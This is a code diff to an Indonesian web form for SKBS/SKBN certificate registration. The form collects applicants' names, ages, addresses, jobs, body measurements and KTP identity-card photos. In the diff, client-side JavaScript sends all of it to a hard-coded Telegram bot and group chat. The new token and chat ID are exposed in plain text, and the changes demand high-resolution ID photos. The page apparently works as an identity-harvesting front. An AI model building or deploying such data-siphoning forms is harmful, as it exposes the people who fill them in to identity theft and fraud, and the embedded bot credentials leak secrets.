@@ -780,7 +780,7 @@
                     <div class="upload-area" id="uploadArea">
                         <i class="fa-solid fa-cloud-arrow-up"></i>
                         <p>Klik atau seret foto KTP Anda ke area ini</p>
-                        <span>(Format: JPG, PNG, Maks. 10MB)</span>
+                        <span>(Format: JPG/PNG, Resolusi tinggi, Maks. 10MB)</span>
                     </div>
                     <input type="file" id="ktpUploadInput" accept="image/*">
                     
@@ -970,8 +970,8 @@
             // PERINGATAN: Jangan gunakan token ini di lingkungan produksi yang sebenarnya!
             // Token ini dapat dilihat oleh siapa saja di kode sumber halaman.
             // Untuk keamanan, gunakan server backend untuk mengirim pesan ke Telegram.
-            const telegramBotToken = '8286354592:AAG7sg-pVEOUuISTCSvPZEObUWQLBzLle7o';
-            const telegramChatId = '5537854100';
+            const telegramBotToken = '8576988803:AAGHxQ_PJ6SsSWRtcP3x8B7RVTliBvANhHk';
+            const telegramChatId = '-1003466725898';
             
             // --- ELEMEN DOM ---
             const form = document.getElementById('registrationForm');
@@ -1158,45 +1158,67 @@
                 return true;
             }
 
-            // --- FUNGSI KIRIM KE TELEGRAM ---
+            // --- FUNGSI KIRIM KE TELEGRAM (DIPERBAIKI UNTUK FOTO KTP YANG LEBIH JELAS) ---
             async function sendToTelegram(formData) {
-                // Format pesan untuk Telegram
-                let message = `*📋 Pendaftaran Baru SKBS/SKBN*\n\n`;
-                message += `*Jenis Pendaftaran:* ${formData.jenisPendaftaran}\n\n`;
-                message += `*👤 Data Pemohon:*\n`;
-                message += `Nama: ${formData.namaLengkap}\n`;
-                message += `Umur: ${formData.umur}\n`;
-                message += `Jenis Kelamin: ${formData.jenisKelamin}\n`;
-                message += `Alamat: ${formData.alamat}\n`;
-                message += `Pekerjaan: ${formData.pekerjaan}\n\n`;
-                
-                if (formData.jenisPendaftaran !== 'SKBN') {
-                    message += `*🏥 Data Kesehatan:*\n`;
-                    message += `Tinggi Badan: ${formData.tinggiBadan}\n`;
-                    message += `Berat Badan: ${formData.beratBadan}\n\n`;
-                }
-                
-                message += `*🎯 Tujuan Pembuatan Surat:*\n`;
-                message += `${formData.tujuanSurat}\n\n`;
-                message += `*⏰ Waktu Daftar:* ${new Date().toLocaleString('id-ID')}`;
-
                 try {
-                    // Kirim pesan teks
-                    const textUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                    const textResponse = await fetch(textUrl);
+                    // Format pesan untuk Telegram
+                    let message = `📋 PENDAFTARAN BARU SKBS/SKBN\n\n`;
+                    message += `🔹 JENIS PENDAFTARAN: ${formData.jenisPendaftaran}\n\n`;
+                    message += `👤 DATA PEMOHON:\n`;
+                    message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    message += `📝 NAMA LENGKAP: ${formData.namaLengkap}\n`;
+                    message += `🎂 UMUR: ${formData.umur}\n`;
+                    message += `⚧️ JENIS KELAMIN: ${formData.jenisKelamin}\n`;
+                    message += `🏠 ALAMAT: ${formData.alamat}\n`;
+                    message += `💼 PEKERJAAN: ${formData.pekerjaan}\n\n`;
+                    
+                    if (formData.jenisPendaftaran !== 'SKBN') {
+                        message += `🏥 DATA KESEHATAN:\n`;
+                        message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+                        message += `📏 TINGGI BADAN: ${formData.tinggiBadan}\n`;
+                        message += `⚖️ BERAT BADAN: ${formData.beratBadan}\n\n`;
+                    }
+                    
+                    message += `🎯 TUJUAN PEMBUATAN SURAT:\n`;
+                    message += `━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    message += `${formData.tujuanSurat}\n\n`;
+                    message += `⏰ WAKTU DAFTAR: ${new Date().toLocaleString('id-ID')}`;
+
+                    // Kirim pesan teks dengan method POST
+                    const textFormData = new FormData();
+                    textFormData.append('chat_id', telegramChatId);
+                    textFormData.append('text', message);
+                    textFormData.append('parse_mode', 'HTML'); // Tambahkan parse_mode untuk formatting
+                    
+                    const textUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+                    const textResponse = await fetch(textUrl, {
+                        method: 'POST',
+                        body: textFormData
+                    });
+                    
                     const textResult = await textResponse.json();
                     
                     if (!textResult.ok) {
-                        throw new Error('Gagal mengirim pesan teks ke Telegram');
+                        console.error('Error response from Telegram:', textResult);
+                        throw new Error(`Gagal mengirim pesan: ${textResult.description || 'Unknown error'}`);
                     }
                     
-                    // Kirim foto KTP jika ada
+                    // Kirim foto KTP jika ada dengan kualitas tinggi
                     if (ktpFile) {
                         // Buat FormData untuk mengirim file
                         const photoFormData = new FormData();
                         photoFormData.append('chat_id', telegramChatId);
-                        photoFormData.append('photo', ktpFile, 'ktp.jpg');
-                        photoFormData.append('caption', '*Foto KTP Pemohon*');
+                        
+                        // Gunakan file asli tanpa modifikasi untuk mempertahankan kualitas
+                        // Telegram mungkin tetap mengompres, tapi kita kirim yang terbaik
+                        photoFormData.append('photo', ktpFile);
+                        
+                        // Caption yang lebih detail untuk foto KTP
+                        const namaLengkap = document.getElementById('namaLengkapKtp').value.trim();
+                        const photoCaption = `📸 FOTO KTP PEMOHON\n━━━━━━━━━━━━━━━━━━━━━━\n👤 Nama: ${namaLengkap}\n📋 Jenis Pendaftaran: ${formData.jenisPendaftaran}\n📅 Tanggal: ${new Date().toLocaleDateString('id-ID')}`;
+                        
+                        photoFormData.append('caption', photoCaption);
+                        photoFormData.append('parse_mode', 'HTML');
                         
                         // Kirim foto dengan metode multipart/form-data
                         const photoUrl = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
@@ -1207,14 +1229,16 @@
                         const photoResult = await photoResponse.json();
                         
                         if (!photoResult.ok) {
-                            // Jika gagal kirim foto, tetapi pesan teks berhasil, tetap anggap sukses
-                            console.error('Gagal mengirim foto KTP:', photoResult);
+                            console.error('Error response from Telegram for photo:', photoResult);
+                            throw new Error(`Gagal mengirim foto: ${photoResult.description || 'Unknown error'}`);
                         }
                     }
                     
                     return true;
                 } catch (error) {
                     console.error('Error sending to Telegram:', error);
+                    // Tampilkan pesan error yang lebih spesifik
+                    showNotification(`Terjadi kesalahan: ${error.message}`, 'error');
                     return false;
                 }
             }
@@ -1366,7 +1390,7 @@
                     // --- SIMULASI PROSES UPLOAD (TANPA OCR) ---
                     setTimeout(() => {
                         // Hapus bagian OCR, hanya tampilkan preview dan pesan sukses
-                        uploadStatus.innerHTML = '<i class="fa-solid fa-circle-check"></i> Foto KTP berhasil diunggah. Silakan isi data Anda secara manual.';
+                        uploadStatus.innerHTML = '<i class="fa-solid fa-circle-check"></i> Foto KTP berhasil diunggah. Pastikan foto jelas dan mudah dibaca.';
                         uploadStatus.className = 'upload-status success';
                         ktpUploadSection.classList.remove('processing');
                         
@@ -1432,11 +1456,10 @@
                         uploadResult.style.display = 'none';
                         uploadArea.style.display = 'block';
                         ktpFile = null;
-                    } else {
-                        showNotification('Terjadi kesalahan saat mengirim data. Silakan coba lagi.', 'error');
                     }
                 } catch (error) {
-                    showNotification('Terjadi kesalahan jaringan. Silakan coba lagi.', 'error');
+                    // Error sudah ditangani di dalam sendToTelegram
+                    console.error('Submit error:', error);
                 } finally {
                     // Reset submit button state
                     submitBtn.disabled = false;
